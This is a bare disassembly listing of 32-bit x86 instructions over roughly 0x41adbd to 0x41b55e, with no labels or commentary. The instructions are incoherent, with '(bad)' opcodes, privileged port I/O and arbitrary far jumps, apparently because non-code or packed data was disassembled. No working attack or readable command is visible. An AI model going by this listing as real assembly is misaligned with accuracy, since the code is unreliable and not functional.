  41adbd:	mov    edx,0x567873bf
  41adc2:	and    al,0xe9
  41adc4:	out    0x37,eax
  41adc6:	out    0x2d,al
  41adc8:	cmp    al,0x52
  41adca:	in     al,0x6
  41adcc:	push   cs
  41adcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adce:	repz cmp al,BYTE PTR [esi]
  41add1:	mov    cl,0x48
  41add3:	or     BYTE PTR ds:0x925f38b3,ch
  41add9:	loopne 0x41ad73
  41addb:	test   ax,0x130d
  41addf:	les    esi,FWORD PTR [eax-0x42]
  41ade2:	retf   
  41ade3:	popa   
  41ade4:	shr    dh,1
  41ade6:	sti    
  41ade7:	inc    ebx
  41ade8:	je     0x41ae29
  41adea:	inc    ebp
  41adeb:	ret    0x9ca7
  41adee:	mov    edx,0x8663c01b
  41adf3:	call   0xc6a1:0xe115eb8f
  41adfa:	cmp    al,ah
  41adfc:	jg     0x41ad86
  41adfe:	test   al,0xf2
  41ae00:	dec    edx
  41ae01:	outs   dx,BYTE PTR ds:[esi]
  41ae02:	push   0xffffffd7
  41ae04:	and    ch,al
  41ae06:	clc    
  41ae07:	ret    
  41ae08:	lods   al,BYTE PTR ds:[esi]
  41ae09:	shl    ch,0xa5
  41ae0c:	out    0xc6,eax
  41ae0e:	dec    edi
  41ae0f:	push   esp
  41ae10:	jbe    0x41ae54
  41ae12:	int3   
  41ae13:	add    eax,0x3bbc416b
  41ae18:	push   0xffffff82
  41ae1a:	ret    
  41ae1b:	repz push edi
  41ae1d:	jecxz  0x41ae91
  41ae1f:	out    0x90,eax
  41ae21:	shr    BYTE PTR [ecx-0x51],1
  41ae24:	add    DWORD PTR [ebx-0x39a488c1],edi
  41ae2a:	lods   eax,DWORD PTR ds:[esi]
  41ae2b:	repnz add esp,DWORD PTR gs:[esi-0x57]
  41ae30:	pop    edx
  41ae31:	leave  
  41ae32:	pop    ecx
  41ae33:	lock out dx,al
  41ae35:	sbb    edi,DWORD PTR ds:0x2960835a
  41ae3b:	rol    edi,cl
  41ae3d:	jmp    0x41add4
  41ae3f:	stos   BYTE PTR es:[edi],al
  41ae40:	mov    edi,0xfc86b60d
  41ae45:	and    eax,0x92e0f955
  41ae4a:	mov    edx,0x268321ad
  41ae4f:	daa    
  41ae50:	jbe    0x41ae24
  41ae52:	out    dx,al
  41ae53:	add    eax,0x42516587
  41ae58:	cs inc ecx
  41ae5a:	pop    ebx
  41ae5b:	std    
  41ae5c:	gs pusha 
  41ae5e:	mov    cl,0xd7
  41ae60:	mov    eax,ds:0xf765f4d9
  41ae65:	stos   BYTE PTR es:[edi],al
  41ae66:	cmp    dh,BYTE PTR [esi-0xc]
  41ae69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae6a:	lea    edx,[ebx]
  41ae6c:	es xor eax,0x60d30eba
  41ae72:	adc    BYTE PTR [esi],0xf
  41ae75:	mov    eax,0x3aba8278
  41ae7a:	fcom   DWORD PTR [ecx-0x19eee7a0]
  41ae80:	cmc    
  41ae81:	add    esp,DWORD PTR [esi]
  41ae83:	mov    ebp,0xcb28dc20
  41ae88:	pop    esi
  41ae89:	int    0xcd
  41ae8b:	jb     0x41ae13
  41ae8d:	ins    BYTE PTR es:[edi],dx
  41ae8e:	adc    BYTE PTR [esi],cl
  41ae90:	mov    ds:0xd00e1221,al
  41ae95:	xor    DWORD PTR [eax+0x44ba1c4d],0x78
  41ae9c:	ss addr16 jo 0x41ae3b
  41aea0:	mov    ds:0x58eb4809,al
  41aea5:	sub    dl,ah
  41aea7:	sbb    al,0x3b
  41aea9:	xor    eax,0x5e326003
  41aeae:	out    dx,eax
  41aeaf:	jp     0x41ae98
  41aeb1:	jmp    0x41ae7c
  41aeb3:	push   es
  41aeb4:	outs   dx,BYTE PTR ds:[esi]
  41aeb5:	mov    bl,0xa6
  41aeb7:	and    eax,0x631024c8
  41aebc:	add    DWORD PTR [ecx+esi*8+0x47],ebx
  41aec0:	xor    eax,0x73d019ce
  41aec5:	pusha  
  41aec6:	pop    eax
  41aec7:	inc    edx
  41aec8:	loope  0x41ae63
  41aeca:	sbb    al,0x39
  41aecc:	adc    edx,DWORD PTR [edi+0x76]
  41aecf:	mov    dh,0x53
  41aed1:	jle    0x41aeac
  41aed3:	arpl   si,bp
  41aed5:	loop   0x41ae90
  41aed7:	xchg   ebx,eax
  41aed8:	loope  0x41ae88
  41aeda:	push   esp
  41aedb:	(bad)  
  41aedc:	xchg   ebp,eax
  41aedd:	int    0x31
  41aedf:	mul    BYTE PTR [eax-0xb282a95]
  41aee5:	fwait
  41aee6:	mov    bh,0x23
  41aee8:	pop    ebp
  41aee9:	or     DWORD PTR [ecx-0x7ca2f520],0x5c871b89
  41aef3:	dec    esp
  41aef4:	in     eax,0x1c
  41aef6:	mov    ebp,0x302e191c
  41aefb:	or     ebp,edx
  41aefd:	mov    cl,0xa6
  41aeff:	push   cs
  41af00:	or     eax,0x7a4ffa62
  41af05:	mov    dl,0x85
  41af07:	stos   BYTE PTR es:[edi],al
  41af08:	push   cs
  41af09:	fwait
  41af0a:	sbb    al,bh
  41af0c:	and    eax,0xd8afcff0
  41af11:	cld    
  41af12:	mov    edx,0xe7413040
  41af17:	gs jae 0x41aec3
  41af1a:	mov    esp,0x23343d36
  41af1f:	inc    ecx
  41af20:	dec    ecx
  41af21:	in     eax,dx
  41af22:	test   al,0x4
  41af24:	les    ecx,FWORD PTR [ebx*8+0x1e4d0271]
  41af2b:	shl    edx,1
  41af2d:	lods   eax,DWORD PTR ds:[esi]
  41af2e:	std    
  41af2f:	shr    al,cl
  41af31:	push   ss
  41af32:	xor    bh,bl
  41af34:	push   eax
  41af35:	nop
  41af36:	jns    0x41af06
  41af38:	ss sbb bl,cl
  41af3b:	inc    eax
  41af3c:	stc    
  41af3d:	or     eax,0x9428e23d
  41af42:	retf   0xbeaf
  41af45:	ficomp DWORD PTR [ebx+0x6283b1eb]
  41af4b:	cmp    ebx,edi
  41af4d:	mov    cl,0x69
  41af4f:	daa    
  41af50:	jmp    0x8066:0xea0c6def
  41af57:	jo     0x41af4e
  41af59:	dec    esp
  41af5a:	jno    0x41af70
  41af5c:	inc    ebp
  41af5d:	popf   
  41af5e:	sub    BYTE PTR [ebp-0x73a8a5c1],ch
  41af64:	(bad)  
  41af66:	cmp    DWORD PTR [edx+0x4fe9a4af],esp
  41af6c:	out    dx,al
  41af6d:	add    eax,0xa9f8ee5d
  41af72:	sub    ebx,DWORD PTR [ecx+esi*2-0x21]
  41af76:	push   ebx
  41af77:	pop    bp
  41af79:	or     al,0x68
  41af7b:	push   ebp
  41af7c:	push   esi
  41af7d:	out    0x36,al
  41af7f:	icebp  
  41af80:	mov    edi,0x1f27d92e
  41af85:	cdq    
  41af86:	push   cs
  41af87:	int    0xd0
  41af89:	pop    edx
  41af8a:	mov    dl,0xc6
  41af8c:	stc    
  41af8d:	mov    eax,0x88b20618
  41af92:	fisubr DWORD PTR [ebx+0x5648a280]
  41af98:	imul   ebp,DWORD PTR [edi-0x58a32790],0xf1b22e69
  41afa2:	leave  
  41afa3:	std    
  41afa4:	addr16 sub eax,0x38f6ef24
  41afaa:	inc    edx
  41afab:	sbb    al,0xe2
  41afad:	xchg   ebp,eax
  41afae:	sbb    BYTE PTR [edx+0x2de33353],0x63
  41afb5:	inc    ecx
  41afb6:	inc    edx
  41afb7:	sub    al,bl
  41afb9:	sbb    esi,edx
  41afbb:	mov    edi,DWORD PTR [ebx+0x45]
  41afbe:	xor    al,0x84
  41afc0:	repnz mov bx,0x9075
  41afc5:	sbb    al,0xc8
  41afc7:	in     eax,dx
  41afc8:	push   ss
  41afc9:	dec    ecx
  41afca:	xchg   edi,eax
  41afcb:	dec    ebp
  41afcc:	or     al,0x4b
  41afce:	cmp    DWORD PTR [ecx-0x25f0682e],ebx
  41afd4:	push   es
  41afd5:	pusha  
  41afd6:	nop
  41afd7:	and    cl,BYTE PTR [ebp-0x65fa8f80]
  41afdd:	ss jmp 0x41af7a
  41afe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afe1:	mov    ah,0x64
  41afe3:	mov    ds:0x92e20e47,al
  41afe8:	pop    ebp
  41afe9:	cmp    BYTE PTR [edx],ah
  41afeb:	hlt    
  41afec:	pop    ebx
  41afed:	push   ebp
  41afee:	pop    es
  41afef:	lahf   
  41aff0:	call   0x88351319
  41aff5:	mov    ds:0x134e35b9,eax
  41affa:	bound  eax,QWORD PTR [ebx+0xb]
  41affd:	int3   
  41affe:	mov    bh,0x6f
  41b000:	sti    
  41b001:	xor    BYTE PTR [ecx+0x18],bh
  41b004:	lods   eax,DWORD PTR ds:[esi]
  41b005:	sbb    BYTE PTR [eax+edi*4+0x5797a5bf],bh
  41b00c:	ret    
  41b00d:	lds    ecx,FWORD PTR [ebx+esi*2]
  41b010:	sub    edx,DWORD PTR [eax]
  41b012:	pusha  
  41b013:	imul   edi,esi,0xa0a7ceb2
  41b019:	adc    eax,0x232cece
  41b01e:	xor    BYTE PTR [edx+0x2170dcb2],dh
  41b024:	mov    eax,0x9b7128d6
  41b029:	dec    DWORD PTR [esi+0x15059981]
  41b02f:	iret   
  41b030:	jg     0x41b0a4
  41b032:	xchg   BYTE PTR [eax+0x1efc40d8],dh
  41b038:	push   edx
  41b039:	aam    0xf
  41b03b:	jmp    DWORD PTR [ebp+0x2a0449df]
  41b041:	dec    esi
  41b042:	les    eax,FWORD PTR [eax+0x4d]
  41b045:	cmp    bh,BYTE PTR [edi]
  41b047:	js     0x41b017
  41b049:	das    
  41b04a:	xchg   ebx,eax
  41b04b:	gs dec ebx
  41b04d:	jle    0xf8af496c
  41b053:	push   es
  41b054:	adc    ebp,ebx
  41b056:	or     DWORD PTR [eax+0x73deb73d],eax
  41b05c:	xchg   ebx,ebx
  41b05e:	sbb    DWORD PTR [edx],ebp
  41b060:	outs   dx,BYTE PTR ds:[esi]
  41b061:	es pusha 
  41b063:	mov    esp,0x723c7e92
  41b068:	rcr    BYTE PTR [esi-0x38f81637],cl
  41b06e:	push   esp
  41b06f:	push   ss
  41b070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b071:	dec    edi
  41b072:	xor    al,al
  41b074:	out    dx,al
  41b075:	adc    al,0xdf
  41b077:	mov    ebx,0x3c11dc2c
  41b07c:	out    dx,al
  41b07d:	ds loopne 0x41b0c8
  41b080:	sbb    eax,0xac55d5a2
  41b085:	aad    0x18
  41b087:	cmp    edi,ebp
  41b089:	retf   
  41b08a:	(bad)  
  41b08b:	sub    eax,0x4efe4a63
  41b090:	mov    edx,0x43a2e1c8
  41b095:	pop    ds
  41b096:	les    ecx,FWORD PTR ss:[esp+ebx*1]
  41b09a:	popf   
  41b09b:	mov    edx,DWORD PTR [esi+esi*4]
  41b09e:	xchg   ecx,eax
  41b09f:	mov    ah,0x39
  41b0a1:	popa   
  41b0a2:	aam    0x9e
  41b0a4:	inc    edi
  41b0a5:	or     dh,bh
  41b0a7:	push   es
  41b0a8:	rcl    DWORD PTR [esi-0x7562c6d0],cl
  41b0ae:	mov    eax,0xb832c4e1
  41b0b3:	leave  
  41b0b4:	test   DWORD PTR [edi-0x33],ebp
  41b0b7:	sub    DWORD PTR [ebp+0x384f5759],ecx
  41b0bd:	cwde   
  41b0be:	xchg   ebp,eax
  41b0bf:	sbb    dh,cl
  41b0c1:	push   eax
  41b0c2:	stc    
  41b0c3:	std    
  41b0c4:	out    0xbe,al
  41b0c6:	mov    DWORD PTR [eax-0x80],esi
  41b0c9:	mov    al,0xd7
  41b0cb:	pop    eax
  41b0cc:	icebp  
  41b0cd:	cmp    eax,0x56a6e757
  41b0d2:	add    esp,DWORD PTR [eax-0x10]
  41b0d5:	test   ebx,ebp
  41b0d7:	add    BYTE PTR [ebp-0x7f],dh
  41b0da:	mov    bl,0x15
  41b0dc:	(bad)  
  41b0dd:	push   esi
  41b0de:	and    DWORD PTR [ecx],0xffffffe9
  41b0e1:	mov    eax,0xd43e97a0
  41b0e6:	lock (bad) 
  41b0e9:	or     DWORD PTR [esi],ebp
  41b0eb:	popa   
  41b0ec:	add    DWORD PTR [ebx+ebx*2],ebp
  41b0ef:	pop    DWORD PTR [ecx+0x2]
  41b0f2:	into   
  41b0f3:	(bad)  
  41b0f4:	push   ebx
  41b0f5:	jno    0x41b133
  41b0f7:	and    BYTE PTR [eax],al
  41b0f9:	fcomp  QWORD PTR [eax+0x1f]
  41b0fc:	or     al,0xaa
  41b0fe:	daa    
  41b0ff:	xor    edx,DWORD PTR [esi]
  41b101:	lods   eax,DWORD PTR ds:[esi]
  41b102:	out    0xd7,eax
  41b104:	mov    edx,0x7684776d
  41b109:	mov    eax,ds:0x504b1657
  41b10e:	push   esp
  41b10f:	cmc    
  41b110:	in     al,dx
  41b111:	push   edx
  41b112:	mov    ds:0xd9af2cd0,al
  41b117:	sub    DWORD PTR [esi+0x79],ebp
  41b11a:	outs   dx,BYTE PTR ds:[esi]
  41b11b:	aaa    
  41b11c:	mul    DWORD PTR [edx-0x32d6e576]
  41b122:	retf   
  41b123:	ror    DWORD PTR [esi],1
  41b125:	inc    ecx
  41b126:	fild   DWORD PTR [eax]
  41b128:	fld    QWORD PTR [esp+ebx*8-0x70213728]
  41b12f:	pop    es
  41b130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	dec    esi
  41b132:	popa   
  41b133:	cmp    ecx,esp
  41b135:	and    DWORD PTR [eax+0x1d],ebp
  41b138:	xchg   DWORD PTR [edi],edx
  41b13a:	dec    ebx
  41b13b:	mov    fs,WORD PTR [ebp-0x52]
  41b13e:	push   esi
  41b13f:	and    DWORD PTR [ecx+0x77f4f288],edi
  41b145:	dec    eax
  41b146:	pop    esp
  41b147:	xchg   edi,eax
  41b148:	jg     0x41b0e8
  41b14a:	jne    0x41b162
  41b14c:	and    esi,eax
  41b14e:	or     eax,0x11da07ea
  41b153:	adc    bl,ch
  41b155:	jle    0x41b14b
  41b157:	into   
  41b158:	imul   BYTE PTR [edx]
  41b15a:	or     bl,BYTE PTR [ebp+0x6c9bd177]
  41b160:	dec    ebp
  41b161:	or     DWORD PTR [ebp+0x47c321ca],ebp
  41b167:	mov    dl,0xfc
  41b169:	pusha  
  41b16a:	pop    esp
  41b16b:	(bad)  
  41b16c:	or     DWORD PTR [esi+0x44],esp
  41b16f:	jbe    0x41b1d2
  41b171:	ret    0x720c
  41b174:	or     BYTE PTR [ebp-0x32],al
  41b177:	ret    
  41b178:	lods   eax,DWORD PTR ds:[esi]
  41b179:	in     al,dx
  41b17a:	xchg   edx,edi
  41b17c:	imul   eax,DWORD PTR [edx-0xd0cd5a],0xffffffe7
  41b183:	sbb    dh,BYTE PTR [ebx+0x627a016a]
  41b189:	inc    BYTE PTR [edx-0x34]
  41b18c:	xor    esp,DWORD PTR [ebp-0x27fcd7e7]
  41b192:	and    al,0xe2
  41b194:	je     0x41b11c
  41b196:	fcmovnb st,st(7)
  41b198:	popa   
  41b199:	mov    ah,0x34
  41b19b:	add    eax,DWORD PTR [edx-0x20223534]
  41b1a1:	mov    dh,0x5f
  41b1a3:	pop    esp
  41b1a4:	popf   
  41b1a5:	add    DWORD PTR [esi-0x13],0x78
  41b1a9:	test   DWORD PTR [ecx-0x3165877],esi
  41b1af:	dec    ecx
  41b1b0:	cdq    
  41b1b1:	mov    esp,0xd774cbc2
  41b1b6:	arpl   si,cx
  41b1b8:	jge    0x41b226
  41b1ba:	sub    al,0x6b
  41b1bc:	jmp    0x41b1e5
  41b1be:	pusha  
  41b1bf:	inc    esp
  41b1c0:	push   ebp
  41b1c1:	movups XMMWORD PTR [eax+0x361cbda4],xmm2
  41b1c8:	stos   BYTE PTR es:[edi],al
  41b1c9:	pop    ecx
  41b1ca:	jno    0x41b1e6
  41b1cc:	int3   
  41b1cd:	push   esp
  41b1ce:	aaa    
  41b1cf:	das    
  41b1d0:	repnz sbb ah,cl
  41b1d3:	dec    esp
  41b1d4:	mov    esi,0x12eb57a1
  41b1d9:	jmp    0x5af8fff6
  41b1de:	adc    edi,DWORD PTR [ebp+esi*2-0x7da95e7c]
  41b1e5:	sti    
  41b1e6:	pop    ds
  41b1e7:	push   cs
  41b1e8:	sahf   
  41b1e9:	pushf  
  41b1ea:	sub    esi,ebx
  41b1ec:	imul   ebp,edi,0x56ad1283
  41b1f2:	fs mov ch,0x49
  41b1f5:	call   0x612d:0xa8e03fb6
  41b1fc:	shl    DWORD PTR [ebx],cl
  41b1fe:	inc    ecx
  41b1ff:	jmp    0x6f327bf8
  41b204:	dec    edi
  41b205:	cdq    
  41b206:	aad    0x34
  41b208:	jmp    0xd0b1:0xdfa07223
  41b20f:	(bad)  
  41b211:	mov    ebp,DWORD PTR [ebp+0x15]
  41b214:	imul   ebx,DWORD PTR [ebp+0x51],0x53
  41b218:	sbb    eax,0xb2f9d6d1
  41b21d:	pushf  
  41b21e:	dec    eax
  41b21f:	ret    0xab8f
  41b222:	in     eax,dx
  41b223:	mov    ebx,0x38613e91
  41b228:	data16 fimul WORD PTR [eax-0x714fdaa3]
  41b22f:	mov    DWORD PTR [eax+0x423ef484],edi
  41b235:	jo     0x41b1ec
  41b237:	addr16 mov esp,0x47f77e07
  41b23d:	outs   dx,BYTE PTR ds:[esi]
  41b23e:	in     eax,dx
  41b23f:	cmp    BYTE PTR [esi+eax*4-0x42],cl
  41b243:	nop
  41b244:	add    DWORD PTR [ebx],esp
  41b246:	retf   0xf5c
  41b249:	lock push ss
  41b24b:	js     0x41b23a
  41b24d:	dec    edi
  41b24e:	push   esp
  41b24f:	mov    al,ds:0xc84a70b2
  41b254:	sub    dh,bl
  41b256:	jnp    0x41b20a
  41b258:	das    
  41b259:	out    0x4e,eax
  41b25b:	add    BYTE PTR [esi-0x55],ah
  41b25e:	dec    ebx
  41b25f:	push   eax
  41b260:	mov    esi,0x2a32b48a
  41b265:	lock mov WORD PTR [ebx-0x10],ds
  41b269:	inc    esi
  41b26a:	xlat   BYTE PTR ds:[ebx]
  41b26b:	lahf   
  41b26c:	jmp    0x3721:0x388574a5
  41b273:	mov    esi,0x9339ff45
  41b278:	jmp    0x41b269
  41b27a:	fcom   QWORD PTR [ebp-0x29c33d3d]
  41b280:	stc    
  41b281:	xor    BYTE PTR [ebx+0x0],ah
  41b284:	sub    DWORD PTR [esi],eax
  41b286:	test   BYTE PTR [eax+0x31],dl
  41b289:	dec    ecx
  41b28a:	inc    ebp
  41b28b:	cmp    al,0x81
  41b28d:	mov    cl,0x9
  41b28f:	mov    esi,0x6812c76c
  41b294:	dec    esi
  41b295:	arpl   WORD PTR [ebx+0x40566cf8],bx
  41b29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b29c:	cmp    BYTE PTR [ecx+0x45389fa3],cl
  41b2a2:	xor    edi,DWORD PTR [esi-0x12f98543]
  41b2a8:	pop    eax
  41b2a9:	imul   BYTE PTR [esi]
  41b2ab:	mov    ss,WORD PTR [eax+0x40f58712]
  41b2b1:	sbb    al,0x99
  41b2b3:	in     eax,dx
  41b2b4:	call   0x18e8eb96
  41b2b9:	mov    es,WORD PTR [ecx-0x71]
  41b2bc:	jnp    0x41b2c4
  41b2be:	sub    bl,cl
  41b2c0:	push   cs
  41b2c1:	mov    dl,0x3e
  41b2c3:	xchg   esp,eax
  41b2c4:	rcr    BYTE PTR [ebp+0x36feca3e],1
  41b2ca:	ins    DWORD PTR es:[edi],dx
  41b2cb:	xchg   esp,eax
  41b2cc:	(bad)  
  41b2ce:	bound  ecx,QWORD PTR [esi]
  41b2d0:	jg     0x41b288
  41b2d2:	fsubr  DWORD PTR [ebx-0x43]
  41b2d5:	bound  edi,QWORD PTR [ebx+0x1b991a1b]
  41b2db:	xchg   BYTE PTR [edi-0x5fee80eb],ah
  41b2e1:	out    dx,eax
  41b2e2:	sub    eax,0x6f5cf5bd
  41b2e7:	lock arpl WORD PTR ds:0x20a5994c,bp
  41b2ee:	or     al,0x13
  41b2f0:	inc    eax
  41b2f1:	(bad)  
  41b2f2:	dec    eax
  41b2f3:	or     eax,0x80f3a574
  41b2f8:	add    al,0x15
  41b2fa:	mov    cl,0x3c
  41b2fc:	and    ecx,eax
  41b2fe:	lea    esp,[edx-0x579d96f]
  41b304:	pmaddwd mm5,QWORD PTR [eax-0x6c29fd48]
  41b30b:	sbb    al,0xcf
  41b30d:	mov    cl,0x56
  41b30f:	in     al,0xd1
  41b311:	ficom  DWORD PTR [ecx-0x70]
  41b314:	int3   
  41b315:	cld    
  41b316:	push   ebp
  41b317:	iret   
  41b318:	call   0x5c793fa8
  41b31d:	sbb    edi,DWORD PTR [edx-0x61]
  41b320:	mov    ecx,0x3499a53b
  41b325:	int    0xdb
  41b327:	(bad)  
  41b328:	out    dx,eax
  41b329:	cld    
  41b32a:	jmp    0x41b311
  41b32c:	sub    eax,0x9f3e52d1
  41b331:	neg    ecx
  41b333:	enter  0xcb93,0xb7
  41b337:	into   
  41b338:	not    BYTE PTR [ebx-0x4]
  41b33b:	or     al,0x82
  41b33d:	ds retf 
  41b33f:	fwait
  41b340:	push   ebx
  41b341:	pop    eax
  41b342:	mov    bh,0xeb
  41b344:	adc    bh,BYTE PTR [edi]
  41b346:	xchg   ebx,eax
  41b347:	mov    ah,0x21
  41b349:	loopne 0x41b309
  41b34b:	ins    DWORD PTR es:[edi],dx
  41b34c:	cmc    
  41b34d:	mov    dh,0x8f
  41b34f:	mov    ebx,0x2e6996e7
  41b354:	fsub   QWORD PTR [edi]
  41b356:	jns    0x41b37f
  41b358:	int3   
  41b359:	pop    ds
  41b35a:	js     0x41b303
  41b35c:	or     ch,BYTE PTR [edi-0x72632402]
  41b362:	adc    DWORD PTR [eax+0x58334],edi
  41b368:	out    0x40,eax
  41b36a:	jg     0x41b3ad
  41b36c:	stos   DWORD PTR es:[edi],eax
  41b36d:	jmp    0xde3b:0x5be27804
  41b374:	push   esp
  41b375:	and    edi,DWORD PTR [ebx+0xe0e7a14]
  41b37b:	xchg   esi,eax
  41b37c:	fisub  WORD PTR [eax+ecx*1]
  41b37f:	sub    al,0xd3
  41b381:	or     al,BYTE PTR [bp+si-0x10]
  41b385:	pop    esi
  41b386:	(bad)  
  41b387:	xor    al,0x76
  41b389:	inc    esp
  41b38a:	push   esp
  41b38b:	jle    0x41b38b
  41b38d:	fmul   QWORD PTR [edi-0x6f7123cf]
  41b393:	lea    esp,ss:[ebx+0x36]
  41b397:	into   
  41b398:	cld    
  41b399:	lods   al,BYTE PTR ds:[esi]
  41b39a:	xchg   ebp,eax
  41b39b:	jmp    0xd347:0x6b7bc69d
  41b3a2:	xchg   ebp,eax
  41b3a3:	dec    ebp
  41b3a4:	in     al,0x70
  41b3a6:	push   ss
  41b3a7:	push   es
  41b3a8:	fucomp st(6)
  41b3aa:	loop   0x41b3f5
  41b3ac:	sbb    eax,0x63afd1c1
  41b3b1:	or     bh,BYTE PTR [ebx]
  41b3b3:	sbb    al,0x9e
  41b3b5:	data16 sar BYTE PTR [ebx],0x5a
  41b3b9:	cwde   
  41b3ba:	fdivr  DWORD PTR [edi-0x40742f13]
  41b3c0:	jns    0x41b37f
  41b3c2:	lods   al,BYTE PTR ds:[esi]
  41b3c3:	fsubr  DWORD PTR [ebp+0x40]
  41b3c6:	jne    0x41b404
  41b3c8:	mov    al,ds:0x509d98d9
  41b3cd:	and    edi,0xffffffae
  41b3d0:	dec    ecx
  41b3d1:	retf   
  41b3d2:	dec    ebx
  41b3d3:	cmc    
  41b3d4:	sbb    al,al
  41b3d6:	push   ds
  41b3d7:	mov    eax,gs
  41b3d9:	outs   dx,DWORD PTR ds:[esi]
  41b3da:	dec    ecx
  41b3db:	lock call 0x626bf595
  41b3e1:	repnz out 0xff,al
  41b3e4:	jbe    0x41b463
  41b3e6:	pushf  
  41b3e7:	mov    edi,0x9d0b81db
  41b3ec:	mov    edi,esi
  41b3ee:	mov    ds:0xf2f3b4c2,al
  41b3f3:	cmp    eax,0xb9ec7b46
  41b3f8:	add    eax,0xfd66f1eb
  41b3fd:	outs   dx,DWORD PTR ds:[esi]
  41b3fe:	xchg   ebx,eax
  41b3ff:	in     al,0x97
  41b401:	dec    ebp
  41b402:	adc    eax,0xc676871f
  41b407:	push   ss
  41b408:	inc    edi
  41b409:	les    edx,FWORD PTR [esi]
  41b40b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b40c:	mov    esp,0x65e6895d
  41b411:	cmp    DWORD PTR [ebx],ebp
  41b413:	into   
  41b414:	add    DWORD PTR [esi],esp
  41b416:	sub    eax,0x3da5a607
  41b41b:	jl     0x41b3cc
  41b41d:	sub    eax,DWORD PTR [edi]
  41b41f:	iret   
  41b420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b421:	xchg   edi,eax
  41b422:	inc    DWORD PTR [eax+0x34]
  41b425:	mov    ds:0xd9fc60b6,al
  41b42a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b42b:	pop    ebp
  41b42c:	inc    edx
  41b42d:	int    0xad
  41b42f:	mov    dl,0xb5
  41b431:	adc    eax,0xf11dde95
  41b436:	out    0xe,eax
  41b438:	xor    ebx,edi
  41b43a:	xor    BYTE PTR [esi],0xd3
  41b43d:	dec    edx
  41b43e:	gs jge 0x41b3fc
  41b441:	or     al,0x7c
  41b443:	push   cs
  41b444:	pop    edi
  41b445:	lea    ecx,ds:0xeb599fc8
  41b44b:	call   0x983d:0x6d5932e0
  41b452:	retf   0x537e
  41b455:	push   es
  41b456:	ins    DWORD PTR es:[edi],dx
  41b457:	fild   WORD PTR [ebp-0x6346dcac]
  41b45d:	movhpd xmm3,xmm5
  41b461:	jb     0x41b4d2
  41b463:	or     edx,DWORD PTR ds:0xfd9ed3f8
  41b469:	mov    edx,0x1cf1e262
  41b46e:	adc    bl,BYTE PTR [esi+0x79a9fc62]
  41b474:	repz mov edi,0x1d0d4c98
  41b47a:	lock or eax,0x5388caa7
  41b480:	fdiv   DWORD PTR ds:0x4e72a2b0
  41b486:	sub    ch,BYTE PTR [edx]
  41b488:	int3   
  41b489:	mov    al,0x10
  41b48b:	sub    edi,DWORD PTR [ebx-0x1]
  41b48e:	ins    BYTE PTR es:[edi],dx
  41b48f:	pop    edx
  41b490:	mov    eax,0x5abe4856
  41b495:	mov    cl,BYTE PTR [edi-0x3d]
  41b498:	xor    eax,0xcab88004
  41b49d:	mov    ebp,0x5f449016
  41b4a2:	pusha  
  41b4a3:	out    0x60,eax
  41b4a5:	inc    ebp
  41b4a6:	sti    
  41b4a7:	mov    ebx,0x6882e716
  41b4ac:	in     eax,0x94
  41b4ae:	mov    al,ds:0x72a2d8a5
  41b4b3:	in     eax,dx
  41b4b4:	inc    edi
  41b4b5:	dec    eax
  41b4b6:	push   edx
  41b4b7:	cmc    
  41b4b8:	mov    DWORD PTR [esi],esi
  41b4ba:	mov    ebp,0x5e681e84
  41b4bf:	inc    esp
  41b4c0:	aaa    
  41b4c1:	push   cs
  41b4c2:	cmp    eax,0x36ee0185
  41b4c7:	add    BYTE PTR [ebx],dl
  41b4c9:	add    ch,BYTE PTR cs:[edi]
  41b4cc:	test   DWORD PTR [edi],0x19d90e56
  41b4d2:	repz jae 0x41b472
  41b4d5:	mov    ebx,eax
  41b4d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d8:	cs pop edi
  41b4da:	fimul  DWORD PTR [edi-0x94ee1e7]
  41b4e0:	jmp    0xb94b:0xddb37a5c
  41b4e7:	inc    ebx
  41b4e8:	test   al,0xeb
  41b4ea:	js     0x41b4fd
  41b4ec:	lock dec ebp
  41b4ee:	sbb    al,0x89
  41b4f0:	push   esi
  41b4f1:	mul    DWORD PTR [edi]
  41b4f3:	jge    0x41b555
  41b4f5:	dec    edx
  41b4f6:	jns    0x41b506
  41b4f8:	cmp    cl,BYTE PTR [edi]
  41b4fa:	inc    esi
  41b4fb:	mov    dl,0x53
  41b4fd:	fsubrp st(4),st
  41b4ff:	xchg   esi,eax
  41b500:	inc    esp
  41b501:	test   bh,bl
  41b503:	loopne 0x41b50b
  41b505:	imul   edx,DWORD PTR [ebx+0x63],0x50
  41b509:	inc    ecx
  41b50a:	add    DWORD PTR [esi],ebx
  41b50c:	aas    
  41b50d:	fwait
  41b50e:	xor    BYTE PTR [edx],cl
  41b510:	dec    eax
  41b511:	push   dx
  41b513:	push   ebx
  41b514:	cwde   
  41b515:	push   0xffffff8f
  41b517:	sahf   
  41b518:	jg     0x41b535
  41b51a:	xlat   BYTE PTR ds:[ebx]
  41b51b:	cld    
  41b51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b51d:	xchg   DWORD PTR [eax-0x66363893],edx
  41b523:	retf   0x10fd
  41b526:	(bad)  
  41b527:	popa   
  41b528:	mov    bl,BYTE PTR [edx+0x9]
  41b52b:	push   0x61
  41b52d:	nop
  41b52e:	and    al,0x91
  41b530:	call   FWORD PTR [edi-0x64]
  41b533:	sub    dl,ch
  41b535:	lods   al,BYTE PTR ds:[esi]
  41b536:	or     DWORD PTR [edi+0x62aadb3],ecx
  41b53c:	dec    ecx
  41b53d:	cld    
  41b53e:	in     eax,dx
  41b53f:	xchg   edx,eax
  41b540:	out    0x6c,al
  41b542:	into   
  41b543:	lods   al,BYTE PTR ds:[esi]
  41b544:	cmp    ch,BYTE PTR [ecx+0x1e70fa2a]
  41b54a:	mov    esp,0xa1d2b2f8
  41b54f:	sub    esp,DWORD PTR ds:0xafca9ad1
  41b555:	push   cs
  41b556:	adc    al,0x70
  41b558:	int3   
  41b559:	(bad)  
  41b55a:	or     DWORD PTR [edx-0x2a],esi
  41b55d:	nop
  41b55e:	xchg   edx,eax
